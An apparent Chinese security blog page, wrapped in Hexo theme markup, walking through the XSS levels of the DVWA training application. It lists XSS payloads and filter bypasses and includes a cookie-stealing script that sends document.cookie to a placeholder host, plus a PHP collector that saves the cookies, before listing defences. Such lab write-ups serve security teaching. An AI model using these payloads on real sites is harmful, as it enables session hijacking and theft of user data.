@@ -1,0 +1,1512 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-bounce.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="keywords" content="DVWA1.10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA1.10之XSS">
+<meta property="og:url" content="http://yoursite.com/2019/05/13/DVWA1-10之XSS/index.html">
+<meta property="og:site_name" content="LoongEyes">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/web_anquan/web_anquan6.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/1.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/32.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/2.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/3.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/4.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/244.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/5.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/33.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/25.png">
+<meta property="og:image" content="http://yoursite.com/images/web_anquan/web_anquan5.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/31.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/6.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/7.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/8.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/26.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/9.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/10.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/11.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/12.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/27.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/13.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/14.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/28.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/15.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/16.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/29.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/17.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/18.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/19.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/20.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/21.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/22.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/30.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/XSS/233.png">
+<meta property="og:updated_time" content="2020-02-24T04:20:17.884Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DVWA1.10之XSS">
+<meta name="twitter:image" content="http://yoursite.com/images/web_anquan/web_anquan6.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/13/DVWA1-10之XSS/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>DVWA1.10之XSS | LoongEyes</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LoongEyes</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/13/DVWA1-10之XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LoongEyes">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LoongEyes">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DVWA1.10之XSS
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-13 21:35:00" itemprop="dateCreated datePublished" datetime="2019-05-13T21:35:00+08:00">2019-05-13</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-02-24 12:20:17" itemprop="dateModified" datetime="2020-02-24T12:20:17+08:00">2020-02-24</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/靶机/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<a id="more"></a>
+<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p><code>XSS</code>，全称<code>Cross Site Scripting</code>，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，<code>XSS</code>不仅仅限于<code>JavaScript</code>，还包括<code>flash</code>等其它脚本语言。根据恶意代码是否存储在服务器中，<code>XSS</code>可以分为存储型的<code>XSS</code>与反射型的<code>XSS</code></p>
+<p><code>DOM</code>型的<code>XSS</code>由于其特殊性，常常被分为第三种，这是一种基于<code>DOM</code>树的<code>XSS</code>。例如服务器端经常使用<code>document.boby.innerHtml</code>等函数动态生成<code>html</code>页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生<code>DOM</code>型的<code>XSS</code>。与前两种<code>XSS</code>相比，它最大的特点就是不与后台服务器交互，只是通过浏览器的<code>DOM</code>树解析产生</p>
+<hr>
+<h1 id="常见XSS利用方式"><a href="#常见XSS利用方式" class="headerlink" title="常见XSS利用方式"></a>常见XSS利用方式</h1><p><code>&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p>
+<p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<p><code>&lt;DIV style=&quot;background-image:url(javascript:alert(&#39;1&#39;))&quot;&gt;</code></p>
+<p><code>&lt;iframe onload=alert(1)&gt;</code></p>
+<p><code>&lt;table&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;ul&gt;</code>等标签也可利用</p>
+<hr>
+<h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p><img src="/images/web_anquan/web_anquan6.png" alt="1.png"></p>
+<h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹框</p>
+<p><img src="/images/baji/dvwa/XSS/1.png" alt="1.png"></p>
+<p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，获取<code>cookie</code></p>
+<p><img src="/images/baji/dvwa/XSS/32.png" alt="32.png"></p>
+<h3 id="XSS的一般收集方式"><a href="#XSS的一般收集方式" class="headerlink" title="XSS的一般收集方式"></a>XSS的一般收集方式</h3><ol>
+<li><p>设计<code>XSS</code>注入代码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&apos;http://xxx.com/xss/HACK.php?x=&apos;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p> 访问<code>http://xxx.com/xss/HACK.php</code>这个网址，并且通过<code>x</code>传递一个变量，即要收集的<code>cookie</code></p>
+</li>
+<li><p>收集<code>cookie</code></p>
+<p> <code>HACK.php</code>页面代码如下：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cookie = $_GET[&apos;x&apos;];</span><br><span class="line">	file_put_contents(&apos;cookie.txt&apos;, $cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><ol>
+<li><p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，失败</p>
+<p> <img src="/images/baji/dvwa/XSS/2.png" alt="2.png"></p>
+<p> 发现<code>&lt;spirt&gt;</code>标签被过滤</p>
+</li>
+<li><p>双写绕过过滤</p>
+<p> 输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>,成功弹窗</p>
+<p> <img src="/images/baji/dvwa/XSS/3.png" alt="3.png"></p>
+</li>
+<li><p>大小写混淆绕过</p>
+<p> 输入<code>&lt;ScRipt&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹窗</p>
+<p> <img src="/images/baji/dvwa/XSS/4.png" alt="4.png"></p>
+</li>
+</ol>
+<h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>查看源代码</p>
+<p><img src="/images/baji/dvwa/XSS/244.png" alt="24.png"></p>
+<p><code>High</code>级别的代码同样使用黑名单过滤输入，<code>preg_replace()</code> 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中<code>i</code>表示不区分大小写）不再有效</p>
+<p>输入<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code>，成功弹框</p>
+<p><img src="/images/baji/dvwa/XSS/5.png" alt="5.png"></p>
+<p>输入<code>&lt;iframe src=1 onload=alert(&#39;xss&#39;)&gt;</code>，成功弹窗</p>
+<p><img src="/images/baji/dvwa/XSS/33.png" alt="33.png"></p>
+<h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>查看源代码</p>
+<p><img src="/images/baji/dvwa/XSS/25.png" alt="25.png"></p>
+<p><code>Impossible</code>级别的代码使用<code>htmlspecialchars</code>函数把预定义的字符<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、<code>&lt;</code>、<code>&gt;</code>转换为 <code>HTML</code>实体，防止浏览器将其作为<code>HTML</code>元素</p>
+<hr>
+<h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p><img src="/images/web_anquan/web_anquan5.png" alt="1.png"></p>
+<h2 id="LOW级别-1"><a href="#LOW级别-1" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>查看源代码</p>
+<p><img src="/images/baji/dvwa/XSS/31.png" alt="31.png"></p>
+<p><code>message</code>一栏输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹框</p>
+<p><img src="/images/baji/dvwa/XSS/6.png" alt="6.png"></p>
+<p><code>name</code>一栏前端有字数限制，抓包改为<code>&lt;script&gt;alert(&#39;name&#39;)&lt;/script&gt;</code>,成功弹窗</p>
+<p><img src="/images/baji/dvwa/XSS/7.png" alt="7.png"></p>
+<p><img src="/images/baji/dvwa/XSS/8.png" alt="8.png"></p>
+<p>相关函数介绍</p>
+<p><code>trim(string,charlist)</code>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、<code>\t</code>、<code>\n</code>、<code>\x0B</code>、<code>\r</code>以及空格，可选参数<code>charlist</code>支持添加额外需要删除的字符</p>
+<p><code>mysql_real_escape_string(string,connection)</code>函数会对字符串中的特殊符号（<code>\x00</code>，<code>\n</code>，<code>\r</code>，<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，<code>\x1a</code>）进行转义</p>
+<p><code>stripslashes(string)</code>函数删除字符串中的反斜杠</p>
+<h2 id="Medium级别-1"><a href="#Medium级别-1" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>查看源代码</p>
+<p><img src="/images/baji/dvwa/XSS/26.png" alt="26.png"></p>
+<p>对<code>message</code>参数使用了<code>htmlspecialchars</code>函数进行编码，因此无法再通过<code>message</code>参数注入<code>XSS</code>代码，但是对于<code>name</code>参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型<code>XSS</code></p>
+<ol>
+<li><p>双写绕过</p>
+<p> 抓包改<code>name</code>参数为<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹窗</p>
+<p> <img src="/images/baji/dvwa/XSS/9.png" alt="9.png"></p>
+<p> <img src="/images/baji/dvwa/XSS/10.png" alt="10.png"></p>
+</li>
+<li><p>大小写混淆绕过</p>
+<p> 抓包改<code>name</code>参数为<code>&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹窗</p>
+<p> <img src="/images/baji/dvwa/XSS/11.png" alt="11.png"></p>
+<p> <img src="/images/baji/dvwa/XSS/12.png" alt="12.png"></p>
+</li>
+</ol>
+<p>相关函数说明</p>
+<p><code>strip_tags()</code>函数剥去字符串中的<code>HTML</code>、<code>XML</code>以及<code>PHP</code>的标签，但允许使用<code>&lt;b&gt;</code>标签</p>
+<p><code>addslashes()</code>函数返回在预定义字符（单引号、双引号、反斜杠、<code>NULL</code>）之前添加反斜杠的字符串</p>
+<h2 id="High级别-1"><a href="#High级别-1" class="headerlink" title="High级别"></a>High级别</h2><p>查看源代码</p>
+<p><img src="/images/baji/dvwa/XSS/27.png" alt="27.png"></p>
+<p><code>name</code>使用正则表达式过滤了<code>&lt;script&gt;</code>标签，但是却忽略了<code>img</code>、<code>iframe</code>等其它危险的标签，因此<code>name</code>参数依旧存在存储型<code>XSS</code></p>
+<p>抓包改<code>name</code>参数为<code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
+<p><img src="/images/baji/dvwa/XSS/13.png" alt="13.png"></p>
+<p><img src="/images/baji/dvwa/XSS/14.png" alt="14.png"></p>
+<h2 id="Impossible级别-1"><a href="#Impossible级别-1" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>查看源代码</p>
+<p><img src="/images/baji/dvwa/XSS/28.png" alt="28.png"></p>
+<p>通过使用<code>htmlspecialchars</code>函数，解决了<code>XSS</code>，但是要注意的是，如果<code>htmlspecialchars</code>函数使用不当，攻击者就可以通过编码的方式绕过函数进行<code>XSS</code>注入，尤其是<code>DOM</code>型的<code>XSS</code></p>
+<hr>
+<h1 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h1><h2 id="LOW级别-2"><a href="#LOW级别-2" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>页面本意是用于修改语言</p>
+<p>对<code>default</code>参数进行构造<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></p>
+<p><img src="/images/baji/dvwa/XSS/15.png" alt="15.png"></p>
+<p>查看网页源代码，<code>JS</code>脚本插入到<code>&lt;option&gt;</code>标签中，被执行</p>
+<p><img src="/images/baji/dvwa/XSS/16.png" alt="16.png"></p>
+<h2 id="Medium级别-2"><a href="#Medium级别-2" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>查看源代码</p>
+<p><img src="/images/baji/dvwa/XSS/29.png" alt="29.png"></p>
+<p>使用了<code>stripos</code> 用于检测<code>default</code>值中是否有 <code>&lt;script</code>，如果有的话，则将<code>default=English</code></p>
+<ol>
+<li><p>对<code>default</code>参数进行构造<code>&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code>,失败</p>
+<p> <img src="/images/baji/dvwa/XSS/17.png" alt="17.png"></p>
+</li>
+<li><p>查看源代码</p>
+<p> 发现<code>JS</code>语句被插入为<code>&lt;option&gt;</code>的<code>value</code>值，未被执行</p>
+<p> <img src="/images/baji/dvwa/XSS/18.png" alt="18.png"></p>
+</li>
+<li><p>要使<code>JS</code>语句执行，应先闭合<code>&lt;option&gt;</code>标签</p>
+<p> 对<code>default</code>参数进行构造<code>&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code></p>
+<p> <img src="/images/baji/dvwa/XSS/19.png" alt="19.png"></p>
+<p> 执行失败，查看源代码</p>
+<p> <img src="/images/baji/dvwa/XSS/20.png" alt="20.png"></p>
+<p> <code>JS</code>代码被执行为<code>&lt;option value=&quot;&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;&quot;&gt;&gt;&lt;/option&gt;</code></p>
+<p> <code>JS</code>代码中只有<code>&gt;</code>被插入到<code>option</code>标签的值中，因为<code>&lt;/option&gt;</code>闭合了<code>&lt;option&gt;</code>标签，所以<code>&lt;img&gt;</code>标签并没有插入</p>
+</li>
+<li><p>继续闭合<code>&lt;select&gt;</code>标签，使得<code>&lt;img&gt;</code>标签为独立的语句</p>
+<p> 对<code>default</code>参数进行构造<code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code>，成功弹框</p>
+<p> <img src="/images/baji/dvwa/XSS/21.png" alt="21.png"></p>
+<p> 查看源代码，<code>JS</code>代码已被执行</p>
+<p> <img src="/images/baji/dvwa/XSS/22.png" alt="22.png"></p>
+</li>
+</ol>
+<h2 id="High级别-2"><a href="#High级别-2" class="headerlink" title="High级别"></a>High级别</h2><p>查看源代码</p>
+<p><img src="/images/baji/dvwa/XSS/30.png" alt="30.png"></p>
+<p>使用<code>switch</code>设置白名单，只允许传的<code>default</code>值为 <code>French</code>、<code>English</code>、<code>German</code>、<code>Spanish</code>其中一个</p>
+<p>构造语句为<code>?default=English #&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<p><img src="/images/baji/dvwa/XSS/233.png" alt="23.png"></p>
+<p>写入效果为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;option value=&apos;&apos;&gt;English #&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/option&gt;</span><br></pre></td></tr></table></figure>
+<p>注释部分的<code>javascript</code>代码不会被传到服务器端，<code>DOM</code>型<code>XSS</code>注入直接获取<code>URL</code>地址内容，则被执行</p>
+<h2 id="Impossible级别-2"><a href="#Impossible级别-2" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>不在客户端做任何事</p>
+<hr>
+<h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><ol>
+<li><p>对输入和<code>URL</code>参数进行过滤(白名单/黑名单)</p>
+</li>
+<li><p>对输出进行编码</p>
+</li>
+<li><p>在服务器端对<code>Cookie</code>设置<code>HttpOnly</code>属性</p>
+</li>
+<li><p>使用自动编码的安全框架</p>
+</li>
+<li><p>使用内容安全策略(<code>CSP</code>)</p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/DVWA1-10/" <i class="fa fa-tag"></i> DVWA1.10</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/12/DVWA之SQL注入/" rel="next" title="DVWA1.10之SQL注入">
+                <i class="fa fa-chevron-left"></i> DVWA1.10之SQL注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/14/信息收集/" rel="prev" title="信息收集--被动">
+                信息收集--被动 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  
+  <div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">---------------The  End---------------</div>
+    
+</div>
+	
+  </div>
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">LoongEyes</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">81</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
